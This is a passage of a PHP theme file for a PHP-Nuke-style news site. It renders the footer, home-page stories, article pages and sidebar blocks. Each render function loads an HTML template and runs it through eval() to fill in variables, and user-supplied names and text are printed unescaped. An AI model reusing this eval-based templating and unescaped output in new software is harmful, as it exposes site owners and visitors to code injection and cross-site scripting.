  echo "             <TD ROWSPAN=2> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_DL_02.gif\" WIDTH=60 HEIGHT=78 ALT=\"\"></TD>\n";
  echo "             <TD width=\"149\" height=\"72\" background=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_DL_03.gif\"><span class=\"style2\">$showdl</span> </TD>\n";
  echo "             <TD ROWSPAN=2> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_DL_04.gif\" WIDTH=5 HEIGHT=78 ALT=\"\"></TD>\n";
  echo "           </TR>\n";
  echo "           <TR>\n";
  echo "             <TD> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_DL_05.gif\" WIDTH=149 HEIGHT=6 ALT=\"\"></TD>\n";
  echo "           </TR>\n";
  echo "         </TABLE></td>\n";
  echo "         <td width=\"100%\" valign=\"middle\"><div align=\"center\">\n";
  echo "           <table width=\"80%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "             <tr>\n";
  echo "               <td valign=\"top\"><div align=\"center\"><span class=\"style1\">\n";
  
       if ($banners) 
{
include("banners.php");
    }
	echo "</span></div></td>\n";
  echo "             </tr>\n";
  echo "           </table>\n";
  echo "         </div></td>\n";
  echo "         <td valign=\"top\"><TABLE WIDTH=205 BORDER=0 CELLPADDING=0 CELLSPACING=0>\n";
  echo "           <TR>\n";
  echo "             <TD> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_CR_01.gif\" WIDTH=54 HEIGHT=21 ALT=\"\"></TD>\n";
  echo "             <TD> <a href=\"http://www.xtrato.com\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_CR_02.gif\" ALT=\"\" WIDTH=41 HEIGHT=21 border=\"0\"></a></TD>\n";
  echo "             <TD> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_CR_03.gif\" WIDTH=110 HEIGHT=21 ALT=\"\"></TD>\n";
  echo "           </TR>\n";
  echo "           <TR>\n";
  echo "             <TD COLSPAN=3> <IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_CR_04.gif\" WIDTH=205 HEIGHT=61 ALT=\"\"></TD>\n";
  echo "           </TR>\n";
  echo "         </TABLE></td>\n";
  echo "       </tr>\n";
  echo "     </table>\n";
  echo "     <table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" id=\"Table_01\">\n";
  echo "       <tr>\n";
  echo "         <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_12.gif\" WIDTH=178 HEIGHT=29 ALT=\"\"></td>\n";
  echo "         <td width=\"100%\" valign=\"top\"><div align=\"center\"></div></td>\n";
  echo "         <td valign=\"top\"><IMG SRC=\"themes/XD-Obstuse/images/FT/XD-Zolu_FT_15.gif\" WIDTH=196 HEIGHT=29 ALT=\"\"></td>\n";
  echo "       </tr>\n";
  echo "     </table></td>\n";
  echo " </tr>\n";
echo "</TABLE>\n";
}

/************************************************************/
/* Function themeindex()                                    */
/* This function format the stories on the Homepage         */
/************************************************************/
function themeindex ($aid, $informant, $time, $title, $counter, $topic, $thetext, $notes, $morelink, $topicname, $topicimage, $topictext) {
    global $anonymous, $tipath;

$ThemeSel = get_theme();
    if (file_exists("themes/$ThemeSel/images/topics/$topicimage")) {
		$t_image = "themes/$ThemeSel/images/topics/$topicimage";
    } 
	else {$t_image = "$tipath$topicimage";}
    if ($notes != "") { $notes = "<br><br><b>Admin's Comment:</b> $notes\n"; } 
	else {$notes = "";}
    if ("$aid" == "$informant") {$content = "$thetext$notes\n";}
	 else {
        if($informant != "") {
            $content = "News submitted by: <a href=\"modules.php?name=Your_Account&amp;op=userinfo&amp;username=$informant\">$informant</a><br><br>";
        } 
		else {$content = "News submitted by: <i>$anonymous</i><br><br>";}
        $content .= "$thetext$notes\n";
    }
    $posted = ""._POSTEDBY." ";
    $posted .= get_author($aid);
    $posted .= " "._ON." $time $timezone ";

    $tmpl_file = "themes/XD-Obstuse/story_home.htm";
    $thefile = implode("", file($tmpl_file));
    $thefile = addslashes($thefile);
    $thefile = "\$r_file=\"".$thefile."\";";
    eval($thefile);
    print $r_file;
}

/************************************************************/
/* Function themeindex()                                    */
/************************************************************/

function themearticle ($aid, $informant, $datetime, $title, $thetext, $topic, $topicname, $topicimage, $topictext) {
    global $admin, $sid, $tipath;
	$ThemeSel = get_theme();
    if (file_exists("themes/$ThemeSel/images/topics/$topicimage")) {
	$t_image = "themes/$ThemeSel/images/topics/$topicimage";
    } else {
	$t_image = "$tipath$topicimage";
}
    $posted = ""._POSTEDON." $datetime "._BY." ";
    $posted .= get_author($aid);
    if ($notes != "") {
        $notes = "<br><br><b>Admin's Comment:</b> <i>$notes</i>\n";
    } else {
        $notes = "";
    }
    if ("$aid" == "$informant") {
        $content = "$thetext$notes\n";
    } else {
        if($informant != "") {
            $content = "News submitted by: <a href=\"modules.php?name=Your_Account&amp;op=userinfo&amp;username=$informant\">$informant</a><br><br> ";
        } else {
            $content = "News submitted by: <i>$anonymous</i><br><br>";
        }
        $content .= "$thetext$notes\n";
    }
    $tmpl_file = "themes/XD-Obstuse/story_page.htm";
    $thefile = implode("", file($tmpl_file));
    $thefile = addslashes($thefile);
    $thefile = "\$r_file=\"".$thefile."\";";
    eval($thefile);
    print $r_file;
}

/************************************************************/
/* Function themesidebox()                                  */
/************************************************************/
function themesidebox($title, $content) { 
   global $swapleftright, $bgcolor1, $bgcolor2; 

if ($swapleftright=="1") { 
	if (file_exists("themes/XD-Obstuse/blocks-right.html")){
    $tmpl_file = "themes/XD-Obstuse/blocks-right.html"; 
	}
	else{
    $tmpl_file = "themes/XD-Obstuse/blocks.htm"; 
	}
}
elseif ($swapleftright=="2") { 
	if (file_exists("themes/XD-Obstuse/blocks-left.html")){
    $tmpl_file = "themes/XD-Obstuse/blocks-left.html"; 
	}
	else{
    $tmpl_file = "themes/XD-Obstuse/blocks.htm"; 
	}
} 
else { 
    $tmpl_file = "themes/XD-Obstuse/blocks.htm"; 
} 

$ThemeSel = get_theme(); // block image titles code
$giftitle = "themes/$ThemeSel/images/block-titles/$title.gif";
$jpgtitle = "themes/$ThemeSel/images/block-titles/$title.jpg";
$jpegtitle = "themes/$ThemeSel/images/block-titles/$title.jpeg";
$pngtitle = "themes/$ThemeSel/images/block-titles/$title.png";
if(file_exists($pngtitle)){
	$title = "<img src=\"$pngtitle\">";
}
else if (file_exists($jpegtitle)){
	$title = "<img src=\"$jpegtitle\">";
}
else if(file_exists($jpgtitle)){
	$title = "<img src=\"$jpgtitle\">";
}
else if (file_exists($giftitle)){
	$title = "<img src=\"$giftitle\">";
}

$thefile = implode("", file($tmpl_file)); 
$thefile = addslashes($thefile); 
$thefile = "\$r_file=\"".$thefile."\";"; 
eval($thefile); 
print $r_file; 

}
?>